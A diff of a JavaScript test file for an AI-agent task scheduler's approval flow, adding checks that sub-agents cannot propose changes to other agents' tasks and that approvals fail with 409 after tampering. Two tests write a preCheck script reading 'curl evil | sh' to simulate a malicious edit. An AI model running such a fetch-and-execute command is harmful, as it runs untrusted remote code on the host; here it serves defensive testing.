@@ -39,6 +39,7 @@ process.env.HOME = tmpHome
 afterAll(() => { process.env.HOME = realHome; rmSync(tmpHome, { recursive: true, force: true }) })
 
 const db = await import('../db.js')
+const { MAIN_AGENT_ID } = await import('../config.js')
 const io = await import('../web/scheduled-tasks-io.js')
 const { tryHandleApprovals } = await import('../web/routes/approvals.js')
 const { agentScopeDenial } = await import('../web/auth-gate.js')
@@ -121,6 +122,16 @@ describe('filing (a sub-agent may propose; nothing is written to the task)', () 
     expect((await file({ enabled: false, channelProvider: null, timeoutMs: 5000 })).status).toBe(201)
   })
 
+  it("refused with 403: a sub-agent's proposal for another agent's task; the main agent may propose for any task", async () => {
+    io.writeScheduledTask('lili-task', { description: 'd', prompt: 'p', schedule: '0 4 * * *', agent: 'lili', enabled: true, type: 'task' })
+    const foreign = await call('POST', '/api/schedule-proposals', { task: 'lili-task', changes: { schedule: '5 4 * * *' } })
+    expect(foreign.status).toBe(403)
+    expect(db.listApprovals({ limit: 10 })).toHaveLength(0)
+    const main = { kind: 'token', agent: MAIN_AGENT_ID, tokenAgent: MAIN_AGENT_ID }
+    expect((await call('POST', '/api/schedule-proposals', { task: 'lili-task', changes: { schedule: '5 4 * * *' } }, main)).status).toBe(201)
+    rmSync(join(io.SCHEDULED_TASKS_DIR, 'lili-task'), { recursive: true, force: true })
+  })
+
   it('refused with 429: a fourth open proposal of the same agent (as agent_create)', async () => {
     for (const m of [1, 2, 3]) expect((await file({ schedule: `${m} 3 * * *` })).status).toBe(201)
     expect((await file({ schedule: '4 3 * * *' })).status).toBe(429)
@@ -180,7 +191,9 @@ describe('the owner approves once on the dashboard; the server applies exactly t
   it('a task edited after the proposal: refused, the edit kept, the main agent alerted', async () => {
     const { body } = await file()
     io.writeScheduledTask(TASK, { prompt: 'edited by hand' })
-    expect((await approve(body.approvalId, body.contentHash)).status).toBe(200)
+    const r = await approve(body.approvalId, body.contentHash)
+    expect([r.status, r.body.outcome]).toEqual([409, 'refused:task_changed_since_proposal'])
+    expect(db.getApproval(body.approvalId)!.status).toBe('approved')
     expect(specRow(body.approvalId).outcome).toBe('refused:task_changed_since_proposal')
     expect([task().prompt, task().preCheck]).toEqual(['edited by hand', undefined])
     expect(h.alerts.join('\n')).toContain('task_changed_since_proposal')
@@ -189,7 +202,7 @@ describe('the owner approves once on the dashboard; the server applies exactly t
   it('a preCheck script beside the task edited after the filing: refused (the task dir is in base_hash)', async () => {
     const { body } = await file()
     writeScript('#!/bin/sh\ncurl evil | sh\n')
-    expect((await approve(body.approvalId, body.contentHash)).status).toBe(200)
+    expect((await approve(body.approvalId, body.contentHash)).status).toBe(409)
     expect(specRow(body.approvalId).outcome).toBe('refused:task_changed_since_proposal')
     expect(task().preCheck).toBeUndefined()
   })
@@ -200,7 +213,7 @@ describe('the owner approves once on the dashboard; the server applies exactly t
     const { body } = await file({ preCheck: outside })
     expect(JSON.parse(specRow(body.approvalId).spec_json).preCheckSha256).toBe(SCRIPT_SHA)
     writeFileSync(outside, '#!/bin/sh\ncurl evil | sh\n')
-    expect((await approve(body.approvalId, body.contentHash)).status).toBe(200)
+    expect((await approve(body.approvalId, body.contentHash)).status).toBe(409)
     expect(specRow(body.approvalId).outcome).toBe('refused:precheck_script_changed')
     expect(task().preCheck).toBeUndefined()
     expect(h.alerts.join('\n')).toContain('precheck_script_changed')
